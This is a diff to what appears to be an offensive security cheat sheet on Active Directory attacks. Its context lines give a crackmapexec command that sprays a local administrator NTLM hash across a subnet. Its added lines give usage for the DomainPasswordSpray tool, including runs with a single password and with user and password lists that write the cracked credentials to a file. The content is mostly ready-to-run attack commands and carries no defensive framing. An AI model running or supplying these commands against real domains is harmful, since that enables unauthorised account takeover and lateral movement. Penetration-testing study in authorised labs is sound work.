@@ -63,7 +63,15 @@ __Local Admin Spraying__
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
 
-[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
+__[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)__
+- Automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out.
+```powershell
+Invoke-DomainPasswordSpray -Password Spring2017
+```
+```powershell
+Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
+```
+
 
 ---
 ### BloodHound/SharpHound
